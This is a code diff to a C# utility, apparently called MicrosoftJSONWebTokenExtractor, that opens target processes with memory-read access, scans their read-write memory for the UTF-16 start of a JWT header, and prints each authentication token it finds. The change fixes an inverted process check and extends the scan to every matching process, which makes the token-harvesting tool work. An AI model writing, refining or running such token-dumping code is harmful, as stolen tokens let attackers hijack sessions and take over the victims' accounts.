@@ -87,50 +87,52 @@ namespace MicrosoftJSONWebTokenExtractor
             long proc_min_address_l = (long)proc_min_address;
             long proc_max_address_l = (long)proc_max_address;
 
-            if (Process.GetProcessesByName(processName).Length > 0) {
-                Console.WriteLine("Are you sure the process {0} is running?", processName);
+            Process[] processes = Process.GetProcessesByName(processName);
+            if (processes.Length == 0)
+            {
+                Console.WriteLine("Are you sure process {0} is running?", processName);
                 return 1;
             }
-            Process process = Process.GetProcessesByName(processName)[0];
-            
-
-            IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, false, process.Id);
-
-            _ = new MEMORY_BASIC_INFORMATION64();
-
-            Int64 bytesRead = 0;
-
-            while (proc_min_address_l < proc_max_address_l)
+            foreach (Process process in processes)
             {
-                _ = VirtualQueryEx(processHandle, proc_min_address, out MEMORY_BASIC_INFORMATION64 mem_basic_info, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION64)));
-                if (mem_basic_info.Protect == PAGE_READWRITE && mem_basic_info.State == MEM_COMMIT)
+                IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, false, process.Id);
+
+                _ = new MEMORY_BASIC_INFORMATION64();
+
+                Int64 bytesRead = 0;
+
+                while (proc_min_address_l < proc_max_address_l)
                 {
-                    byte[] buffer = new byte[mem_basic_info.RegionSize];
-                    ReadProcessMemory((int)processHandle, (Int64)mem_basic_info.BaseAddress, buffer, (Int64)mem_basic_info.RegionSize, ref bytesRead);
-
-                    byte[] pattern = new byte[] { 101, 0, 121, 0, 74, 0, 48, 0, 101, 0, 88, 0, 65, 0, 105, 0, 79, 0, 105, 0, 74, 0, 75, 0, 86, 0, 49, 0, 81, 0, 105, 0, 76, 0 };
-
-                    if (Encoding.Unicode.GetString(buffer).Contains(search))
+                    _ = VirtualQueryEx(processHandle, proc_min_address, out MEMORY_BASIC_INFORMATION64 mem_basic_info, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION64)));
+                    if (mem_basic_info.Protect == PAGE_READWRITE && mem_basic_info.State == MEM_COMMIT)
                     {
-                        List<int> positions = SearchBytePattern(pattern, buffer);
+                        byte[] buffer = new byte[mem_basic_info.RegionSize];
+                        ReadProcessMemory((int)processHandle, (Int64)mem_basic_info.BaseAddress, buffer, (Int64)mem_basic_info.RegionSize, ref bytesRead);
 
-                        foreach (var item in positions)
+                        byte[] pattern = new byte[] { 101, 0, 121, 0, 74, 0, 48, 0, 101, 0, 88, 0, 65, 0, 105, 0, 79, 0, 105, 0, 74, 0, 75, 0, 86, 0, 49, 0, 81, 0, 105, 0, 76, 0 };
+
+                        if (Encoding.Unicode.GetString(buffer).Contains(search))
                         {
-                            Console.WriteLine("JSON Web Token found at memory address {0} for process: {1}", item, processName);
-                            byte[] source = buffer;
-                            byte[] byteSection = new byte[4096];
-                            Buffer.BlockCopy(source, item, byteSection, 0, byteSection.Length);
-                            var JWT = System.Text.Encoding.Unicode.GetString(byteSection);
-                            var regex = new Regex("[^-A-Za-z0-9+/=._]|=[^=]|={3,}$");
-                            var match = regex.Match(JWT);
-                            string ValidJWT = JWT.ToString().Substring(0, match.Index);
-                            Console.WriteLine(ValidJWT);
-                            Console.WriteLine("");
+                            List<int> positions = SearchBytePattern(pattern, buffer);
+
+                            foreach (var item in positions)
+                            {
+                                Console.WriteLine("JSON Web Token found at memory address {0} for process: {1}", item, processName);
+                                byte[] source = buffer;
+                                byte[] byteSection = new byte[4096];
+                                Buffer.BlockCopy(source, item, byteSection, 0, byteSection.Length);
+                                var JWT = System.Text.Encoding.Unicode.GetString(byteSection);
+                                var regex = new Regex("[^-A-Za-z0-9+/=._]|=[^=]|={3,}$");
+                                var match = regex.Match(JWT);
+                                string ValidJWT = JWT.ToString().Substring(0, match.Index);
+                                Console.WriteLine(ValidJWT);
+                                Console.WriteLine("");
+                            }
                         }
                     }
+                    proc_min_address_l += (Int64)mem_basic_info.RegionSize;
+                    proc_min_address = new IntPtr(proc_min_address_l);
                 }
-                proc_min_address_l += (Int64)mem_basic_info.RegionSize;
-                proc_min_address = new IntPtr(proc_min_address_l);
             }
             return 0;
         }
